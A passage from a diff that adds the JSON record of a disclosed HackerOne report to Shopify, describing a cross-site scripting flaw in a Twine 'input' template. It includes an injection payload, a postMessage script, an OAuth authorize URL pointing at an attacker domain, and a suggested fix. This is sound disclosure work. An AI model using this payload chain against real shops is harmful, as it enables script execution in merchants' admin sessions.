}&quot;</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span> <span class=\"k\">catch</span> <span class=\"p\">(</span><span class=\"nx\">error</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nx\">e</span> <span class=\"o\">=</span> <span class=\"nx\">error</span><span class=\"p\">;</span>\n      <span class=\"k\">throw</span> <span class=\"s2\">&quot;Twine error: Unable to create function on &quot;</span> <span class=\"o\">+</span> <span class=\"nx\">node</span><span class=\"p\">.</span><span class=\"nx\">nodeName</span> <span class=\"o\">+</span> <span class=\"s2\">&quot; node with attributes &quot;</span> <span class=\"o\">+</span> <span class=\"p\">(</span><span class=\"nx\">stringifyNodeAttributes</span><span class=\"p\">(</span><span class=\"nx\">node</span><span class=\"p\">));</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">};</span>\n</code></pre>\n<p>The method wraps the attribute value in a <a href=\"/redirect?signature=dd5e7936582f5a47213757ea886a48cab578b3a1&amp;url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FStatements%2Fwith\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>with</span><i class=\"icon-external-link\"></i></a> block to provide named variables and passes it to a <a href=\"/redirect?signature=58a962c7c609066ec0334dc21d610f5fde4b57d7&amp;url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FFunction\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Function</span><i class=\"icon-external-link\"></i></a> constructor which acts as a eval primitive. This means any injection will result in JavaScript execution. For example, if the following data is used for the <code>value</code> template parameter it will flow as follows:</p>\n<pre class=\"highlight plaintext\"><code>&#39;-alert(document.domain)-&#39;\n</code></pre>\n<p>This will result in a <code>data-define</code> attribute with the following value:</p>\n<pre class=\"highlight javascript\"><code><span class=\"p\">{</span><span class=\"nl\">typedInput</span><span class=\"p\">:</span><span class=\"s1\">&#39;&#39;</span><span class=\"o\">-</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">domain</span><span class=\"o\">-</span><span class=\"s1\">&#39;&#39;</span><span class=\"p\">}</span>\n</code></pre>\n<p>This will result in the following code executing within twine:</p>\n<pre class=\"highlight javascript\"><code><span class=\"kd\">with</span><span class=\"p\">(</span><span class=\"nx\">$context</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"kd\">with</span><span class=\"p\">(</span><span class=\"nx\">$registry</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">return</span> <span class=\"p\">{</span><span class=\"na\">typedInput</span><span class=\"p\">:</span> <span class=\"s1\">&#39;&#39;</span><span class=\"o\">-</span><span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">domain</span><span class=\"p\">)</span><span class=\"o\">-</span><span class=\"s1\">&#39;&#39;</span><span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</code></pre>\n<p>Putting this all together with the SDK we get the following script:</p>\n<pre class=\"highlight javascript\"><code><span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">parent</span><span class=\"p\">.</span><span class=\"nx\">postMessage</span><span class=\"p\">(</span><span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">({</span>\n  <span class=\"na\">message</span><span class=\"p\">:</span> <span class=\"s2\">&quot;Shopify.API.Modal.input&quot;</span><span class=\"p\">,</span>\n  <span class=\"na\">data</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n    <span class=\"na\">message</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n      <span class=\"na\">message</span><span class=\"p\">:</span> <span class=\"s2\">&quot;&quot;</span><span class=\"p\">,</span> \n      <span class=\"na\">value</span><span class=\"p\">:</span> <span class=\"s2\">&quot;&#39;-alert(document.domain)-&#39;&quot;</span><span class=\"p\">,</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}),</span> <span class=\"s2\">&quot;*&quot;</span><span class=\"p\">);</span>\n</code></pre>\n<h1 id=\"exploitability\">Exploitability</h1>\n\n<p>You need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application. </p>\n\n<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n\n<p>I&#39;ve created an example malicious application associated with my partner account <code>shopify-whitehat-1@bored.engineer</code> to demonstrate the issue...<br>\nOpen the following URL on on <code>$your-shop$.myshopify.com</code>:</p>\n<pre class=\"highlight plaintext\"><code>/admin/oauth/authorize?client_id=5b7bd427b8caa69610bf85d1c87d4a04&amp;scope=read_products&amp;redirect_uri=https://attackerdoma.in/a4d76231-8657-48ed-8800-f1b02c7bb2ff.html&amp;state=nonce\n</code></pre>\n<p>After authorizing the application an alert should appear on the <code>/admin</code> window containing <code>document.domain</code>.</p>\n\n<h1 id=\"remediation\">Remediation</h1>\n\n<p>The &quot;input&quot; template should be updated to make the <code>value</code> parameter context-aware, perhaps wrapping in a <code>JSON.stringify</code> call.</p>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.shopify.com", 
+            "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.", 
+            "twitter_handle": "", 
+            "name": "Shopify"
+        }, 
+        "handle": "shopify", 
+        "url": "https://hackerone.com/shopify", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/001/382/1e9872bf9cfe04008c2673e07bfecaa83858cca1_small.jpg?1532728703", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 1382, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
